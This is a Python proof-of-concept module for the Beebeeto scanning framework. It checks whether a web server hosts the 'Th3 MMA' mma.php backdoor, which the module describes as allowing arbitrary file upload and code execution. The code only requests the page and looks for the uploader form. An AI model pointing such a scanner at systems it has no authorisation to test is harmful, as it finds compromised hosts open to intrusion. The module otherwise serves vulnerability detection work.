#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0147',
            'name': 'Th3 MMA /images/mma.php Backdoor 任意文件上传漏洞 POC',
            'author': 'foundu',
            'create_date': '2015-10-28',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Th3 MMA',
            'vul_version': ['*'],
            'type': 'Other',
            'tag': ['Th3 MMA 漏洞', '/images/mma.php', '后门', 'php'],
            'desc': '''
                    This module exploits Th3 MMA mma.php Backdoor which allows an arbitrary
                    file upload that leads to arbitrary code execution.
                    This backdoor also echoes the Linux kernel version or operating system
                    version because of the php_uname() function.
                    ''',
            'references': ['http://blog.pages.kr/1307'],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/images/mma.php"
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = requests.get(verify_url).content
        if 'multipart/form-data" name="uploader" id="uploader">' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint
    mp = MyPoc()
    pprint(mp.run())